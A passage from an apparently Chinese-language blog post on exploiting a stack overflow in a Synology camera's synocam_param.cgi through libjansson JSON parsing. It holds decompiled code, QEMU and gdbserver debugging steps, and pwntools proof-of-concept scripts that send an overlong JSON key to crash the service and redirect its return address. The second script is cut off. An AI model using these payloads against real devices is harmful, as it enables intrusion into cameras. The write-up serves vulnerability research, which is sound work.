class="number">1</span>].type = sub_725A8(v3);</span><br><span class="line">  <span class="keyword">if</span> ( a3[<span class="number">1</span>].type == JSON_INTEGER )</span><br><span class="line">  {</span><br><span class="line">    refcount = a3-&gt;refcount;</span><br><span class="line">    v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_E19C(json, <span class="string">"format"</span>);</span><br><span class="line">    send_page(refcount, <span class="number">400</span>, <span class="string">"Unknown output format[%s]!"</span>, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    method = (<span class="type">char</span> *)sub_E174((<span class="type">int</span>)json);</span><br><span class="line">    <span class="keyword">if</span> ( method &amp;&amp; !strcasecmp(method, <span class="string">"GET"</span>) )</span><br><span class="line">    {</span><br><span class="line">      handle_get((<span class="type">int</span>)a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( method &amp;&amp; !strcasecmp(method, <span class="string">"PUT"</span>) )</span><br><span class="line">    {</span><br><span class="line">      handle_put(a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( method &amp;&amp; !strcasecmp(method, <span class="string">"POST"</span>) )</span><br><span class="line">    {</span><br><span class="line">      handle_post(a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !method || strcasecmp(method, <span class="string">"DELETE"</span>) )</span><br><span class="line">      {</span><br><span class="line">        send_page(a3-&gt;refcount, <span class="number">400</span>, <span class="string">"Wrong request method[%s]!"</span>, method);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      hanlde_delete(a3);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( off_B8218 != &amp;dword_C8 )</span><br><span class="line">    {</span><br><span class="line">      v7 = a3-&gt;refcount;</span><br><span class="line">      v8 = off_B8218;</span><br><span class="line">      v9 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str(&amp;unk_B82F4);</span><br><span class="line">      send_page(v7, v8, <span class="string">"%s"</span>, v9);</span><br><span class="line">    }</span><br><span class="line">    sub_80A70(&amp;unk_B830C);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在<code>handle_post</code>中，发现传入的数据会进入<code>final_json_load</code>，而<code>final_json_load</code>里会调用<code>json_loads</code></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_79FEC</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">......</span><br><span class="line">  v1 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_E19C</span>(*a1, <span class="string">"json"</span>);</span><br><span class="line">  v24 = <span class="built_in">final_json_load</span>(v1);</span><br><span class="line">  file = <span class="built_in">json_load_file</span>(<span class="string">"/www/camera-cgi/synocam_config.json"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = <span class="built_in">getenv</span>(<span class="string">"SCRIPT_NAME"</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(v2 + <span class="number">1</span>, <span class="number">47</span>);</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">json_t</span> *__fastcall <span class="title">final_json_load</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">json_t</span> *v5; <span class="comment">// [sp+Ch] [bp-308h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+10h] [bp-304h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">516</span>]; <span class="comment">// [sp+110h] [bp-204h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="built_in">sizeof</span>(v6));</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">json_loads</span>(a1, <span class="number">4u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (!v5 || v5-&gt;type == JSON_NULL) &amp;&amp; <span class="built_in">sub_10D90</span>(a1, s, <span class="number">512</span>) == <span class="number">1</span> )</span><br><span class="line">    v5 = <span class="built_in">json_loads</span>(s, <span class="number">4u</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (!v5 || v5-&gt;type == JSON_NULL) &amp;&amp; !<span class="built_in">strchr</span>(a1, <span class="number">34</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">snprintf</span>(v6, <span class="number">0x100</span>u, <span class="string">"\"%s\""</span>, a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">json_loads</span>(v6, <span class="number">4u</span>, <span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>至此漏洞分析完成</p><h2 id="Poc-amp-调试"><a href="#Poc-amp-调试" class="headerlink" title="Poc&amp;调试"></a>Poc&amp;调试</h2><p>我编写了如下Poc，发现可以让目标crash</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">8801</span></span><br><span class="line"></span><br><span class="line">r = remote(ip, port)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a '</span> + <span class="string">b'a'</span> * <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">b'""'</span></span><br><span class="line">json = <span class="string">b'{"'</span> + p1 + <span class="string">b'": ""}'</span></span><br><span class="line">li(json)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b'\r\n'</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b''</span></span><br><span class="line">p3 += <span class="string">b'POST /syno-api/security/info/mac HTTP/1.1'</span> + rn</span><br><span class="line">p3 += (<span class="string">b"Content-Length: %d"</span> % <span class="built_in">len</span>(json)) +rn</span><br><span class="line">p3 += <span class="string">b'Host: 127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept: text/plain, */*; q=0.01'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Content-Type: application/json'</span> + rn</span><br><span class="line">p3 += <span class="string">b'X-Requested-With: XMLHttpRequest'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-mobile: ?0'</span> + rn</span><br><span class="line">p3 += <span class="string">b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-platform: "macOS"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Origin: http://127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Site: same-origin'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Mode: cors'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Dest: empty'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Referer: http://127.0.0.1:8801/'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Encoding: gzip, deflate'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Language: zh-CN,zh;q=0.9'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Connection: close'</span> + rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += json</span><br><span class="line"></span><br><span class="line">li(<span class="string">'[+] sendling payload'</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>接着需要去调试一下这个Poc，看一下能否控制程序执行流，下载对应架构的gdbserver到文件系统中，然后<code>find . | cpio -o --format=newc &gt; ../player.cpio</code>打包一下，重新启动就可以使用gdbserver了</p><p>添加gdbserver的映射端口</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">-m 1024 \</span><br><span class="line">-M virt,highmem=off \</span><br><span class="line"> -kernel zImage \</span><br><span class="line">    -initrd player.cpio \</span><br><span class="line">-nic user,hostfwd=tcp:0.0.0.0:8801-:80,hostfwd=tcp:0.0.0.0:8802-:8802,hostfwd=tcp:0.0.0.0:1234-:1234 \</span><br><span class="line"> -nographic</span><br></pre></td></tr></tbody></table></figure><p>调试方法有很多种，qemu调试cgi、fork + execute调试、patch、这里已经发现了漏洞，直接采用真实的远程环境来调试exp</p><p>采取<a href="https://blog.csdn.net/tuzhutuzhu/article/details/23705485">GDB调试fork+exec创建的子进程的方法</a>来调试</p><p>attach到webd这个pid中</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># ps</span></span><br><span class="line">ps</span><br><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 synodebu  1:18 init</span><br><span class="line">    2 synodebu  0:00 [kthreadd]</span><br><span class="line">    3 synodebu  0:00 [rcu_gp]</span><br><span class="line">    4 synodebu  0:00 [rcu_par_gp]</span><br><span class="line">    5 synodebu  0:00 [slub_flushwq]</span><br><span class="line">    7 synodebu  0:00 [kworker/0:0H-ev]</span><br><span class="line">    9 synodebu  0:00 [mm_percpu_wq]</span><br><span class="line">   10 synodebu  5:58 [ksoftirqd/0]</span><br><span class="line">   11 synodebu  1h16 [rcu_sched]</span><br><span class="line">   12 synodebu  0:00 [migration/0]</span><br><span class="line">   13 synodebu  0:00 [cpuhp/0]</span><br><span class="line">   14 synodebu  0:00 [kdevtmpfs]</span><br><span class="line">   15 synodebu  0:00 [inet_frag_wq]</span><br><span class="line">   16 synodebu  2:43 [kworker/0:1-eve]</span><br><span class="line">   17 synodebu  0:00 [oom_reaper]</span><br><span class="line">   18 synodebu  0:00 [writeback]</span><br><span class="line">   19 synodebu  4:13 [kcompactd0]</span><br><span class="line">   35 synodebu  0:00 [kblockd]</span><br><span class="line">   36 synodebu  0:00 [ata_sff]</span><br><span class="line">   37 synodebu  0:00 [edac-poller]</span><br><span class="line">   38 synodebu  0:00 [devfreq_wq]</span><br><span class="line">   39 synodebu  0:00 [watchdogd]</span><br><span class="line">   40 synodebu  0:00 [kworker/u2:1-ev]</span><br><span class="line">   41 synodebu  0:00 [rpciod]</span><br><span class="line">   42 synodebu  0:00 [kworker/0:1H]</span><br><span class="line">   43 synodebu  0:00 [kworker/u3:0]</span><br><span class="line">   44 synodebu  0:00 [xprtiod]</span><br><span class="line">   45 synodebu  0:00 [kswapd0]</span><br><span class="line">   46 synodebu  0:00 [kworker/u2:2-ev]</span><br><span class="line">   47 synodebu  0:00 [nfsiod]</span><br><span class="line">   50 synodebu  0:00 [mld]</span><br><span class="line">   51 synodebu  0:00 [ipv6_addrconf]</span><br><span class="line">   52 synodebu  0:00 [kworker/0:2]</span><br><span class="line">  129 synodebu  0:00 inetd</span><br><span class="line">  208 synodebu  0:00 /bin/kmesg_monitor</span><br><span class="line">  210 synodebu  7h57 /bin/systemd</span><br><span class="line">  232 synodebu 12:11 ntpdaemon</span><br><span class="line">  240 synodebu 17:31 syslogd -b 1 -s 200 -n -f /tmp/syslogd.conf</span><br><span class="line">  318 synodebu  0:41 wpa_supplicant -ieth0 -Dwired -c /tmp/wpa_supplicant-eth0.</span><br><span class="line">  322 synodebu  0:05 zcip -f eth0 /bin/zcipnotify</span><br><span class="line">  330 synodebu  1:00 dhcpcd: eth0 [ip4]</span><br><span class="line">  363 synodebu 11h34 /bin/streamd</span><br><span class="line">  367 synodebu 34:09 /bin/central_server</span><br><span class="line">  369 synodebu 33:35 /bin/synoactiond</span><br><span class="line">  375 synodebu 20:25 /bin/recorder</span><br><span class="line">  428 synodebu  0:01 telnetd -p 9901 -l /bin/sh</span><br><span class="line">  431 synodebu  0:00 init</span><br><span class="line">  559 synodebu  5h33 /bin/webd</span><br><span class="line"> 4853 synodebu  0:00 /bin/sh</span><br><span class="line"> 4858 synodebu  0:00 ps</span><br><span class="line"> / <span class="comment"># gdbserver :1234 --attach 559</span></span><br><span class="line">gdbserver :1234 --attach 559</span><br><span class="line">Attached; pid = 559</span><br><span class="line">Listening on port 123</span><br></pre></td></tr></tbody></table></figure><p>用gdb-multiarch连上来之后就可以发现已经可以调试webd了</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode parent                                                                      </span><br><span class="line">pwndbg&gt; c                                                                                                </span><br><span class="line">Continuing.                                                                                               </span><br><span class="line">[Detaching after vfork from child process 6200]                                                     </span><br><span class="line">[Detaching after fork from child process 6201]</span><br></pre></td></tr></tbody></table></figure><p>有个vfork，跳过这个vfork，直接捕获一下fork</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode parent                                                                      </span><br><span class="line">pwndbg&gt; catch fork</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></tbody></table></figure><p>此时vfork已经被跳过，此时已经到了fork这里，跟进cgi程序，捕获exec之后就可以发现已经到了synocam_param.cgi，但是会卡住，虽然会卡住，但是不影响执行命令，回车之后继续Continuing，此时发现目标crash</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child                                                                      </span><br><span class="line">pwndbg&gt; catch <span class="built_in">exec</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">......</span><br><span class="line">Thread 2.1 <span class="string">"synocam_param.c"</span> hit Catchpoint 2 (<span class="built_in">exec</span><span class="string">'d /www/camera-cgi/synocam_param.cgi), 0x76fcea00 in ?? () from target:/lib/ld-linux-armhf.so.3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Continuing.</span></span><br><span class="line"><span class="string">Reading /lib/libjansson.so.4 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libutil.so from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libpthread.so.0 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libcurl.so.4 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libcrypto.so.1.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libssl.so.1.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libz.so.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libdl.so.2 from remote target...</span></span><br><span class="line"><span class="string">Reading /usr/lib/libstdc++.so.6 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libm.so.6 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libgcc_s.so.1 from remote target...</span></span><br><span class="line"><span class="string">Reading /lib/libc.so.6 from remote target...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thread 2.1 "synocam_param.c" received signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">0x76fb7f88 in ?? () from target:/lib/libjansson.so.4</span></span><br></pre></td></tr></tbody></table></figure><p>crash之后的状态</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────</span><br><span class="line">*R0   0x7efff240 ◂— <span class="string">'aaaa'</span></span><br><span class="line"> R1   0x0</span><br><span class="line"> R2   0x0</span><br><span class="line">*R3   0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*R4   0x4b7954 ◂— 0xb77f4</span><br><span class="line"> R5   0x0</span><br><span class="line">*R6   0x407464 ◂— mov fp, <span class="comment">#0</span></span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line">*R10  0x4b7954 ◂— 0xb77f4</span><br><span class="line">*R11  0x7efff144 —▸ 0x7efff15c —▸ 0x76fb4c40 ◂— ldr r3, [fp, <span class="comment">#-0x48]</span></span><br><span class="line"> R12  0x0</span><br><span class="line">*SP   0x7efff138 ◂— 0x0</span><br><span class="line">*PC   0x76fb7f88 ◂— strb r2, [r3]</span><br><span class="line">────────────────────────────────────[ DISASM / arm / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]─────────────────────────────────────</span><br><span class="line"> ► 0x76fb7f88    strb   r2, [r3]</span><br><span class="line">   0x76fb7f8c    nop</span><br><span class="line">   0x76fb7f90    add    sp, fp, <span class="comment">#0</span></span><br><span class="line">   0x76fb7f94    pop    {fp}</span><br><span class="line">   0x76fb7f98    bx     lr</span><br><span class="line"></span><br><span class="line">   0x76fb7f9c    str    fp, [sp, <span class="comment">#-4]!</span></span><br><span class="line">   0x76fb7fa0    add    fp, sp, <span class="comment">#0</span></span><br><span class="line">   0x76fb7fa4    sub    sp, sp, <span class="comment">#0xc</span></span><br><span class="line">   0x76fb7fa8    str    r0, [fp, <span class="comment">#-8]</span></span><br><span class="line">   0x76fb7fac    ldr    r3, [fp, <span class="comment">#-8]</span></span><br><span class="line">   0x76fb7fb0    ldr    r3, [r3]</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了方便调试，直接写个脚本来捕获cgi</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line">catch fork</span><br><span class="line">c</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">catch <span class="built_in">exec</span></span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure><p>此时卡住之后发现cgi没有被彻底载入</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line">  0x400000   0x4a7000 r-xp    a7000      0 /www/camera-cgi/synocam_param.cgi</span><br><span class="line">  0x4b7000   0x4b9000 rw-p     2000  a7000 /www/camera-cgi/synocam_param.cgi</span><br><span class="line">0x76fce000 0x76fee000 r-xp    20000      0 /lib/ld-2.30.so</span><br><span class="line">0x76ffb000 0x76ffc000 r-xp     1000      0 [sigpage]</span><br><span class="line">0x76ffc000 0x76ffd000 r--p     1000      0 [vvar]</span><br><span class="line">0x76ffd000 0x76ffe000 r-xp     1000      0 [vdso]</span><br><span class="line">0x76ffe000 0x77000000 rw-p     2000  20000 /lib/ld-2.30.so</span><br><span class="line">0x7efdf000 0x7f000000 rw-p    21000      0 [stack]</span><br><span class="line">0xffff0000 0xffff1000 r-xp     1000      0 [vectors]</span><br></pre></td></tr></tbody></table></figure><p>在0x7464这里下断点之后就可以看到<code>/lib/libjansson.so.4.7.0</code>的地址，此时跟据这个基址在漏洞点下一个断点，就可以调试漏洞点了</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">0x76fae000 0x76fbd000 r-xp     f000      0 /lib/libjansson.so.4.7.0</span><br><span class="line">0x76fbd000 0x76fcc000 ---p     f000   f000 /lib/libjansson.so.4.7.0</span><br><span class="line">0x76fcc000 0x76fcd000 r--p     1000   e000 /lib/libjansson.so.4.7.0</span><br><span class="line">0x76fcd000 0x76fce000 rw-p     1000   f000 /lib/libjansson.so.4.7.0</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; b *0x76fae000 + 0x6BE0</span><br><span class="line">Breakpoint 4 at 0x76fb4be0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 2.1 <span class="string">"synocam_param.c"</span> hit Breakpoint 4, 0x76fb4be0 <span class="keyword">in</span> ?? () from target:/lib/libjansson.so.4</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x76fae000 + 0x6BE4</span><br><span class="line">Breakpoint 5 at 0x76fb4be4</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; x/20wx 0x7efff174</span><br><span class="line">0x7efff174:     0x76fd0061      0x00000001      0x76ff7000      0x7efff168</span><br><span class="line">0x7efff184:     0x7bfff210      0x7b000001      0x00000001      0x7efff1ab</span><br><span class="line">0x7efff194:     0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x7efff1a4:     0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x7efff1b4:     0x61616161      0x61616161      0x61616161      0x61616161</span><br></pre></td></tr></tbody></table></figure><p>调试之后，如下Poc就可以劫持返回地址为0x62626262了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, log_level=<span 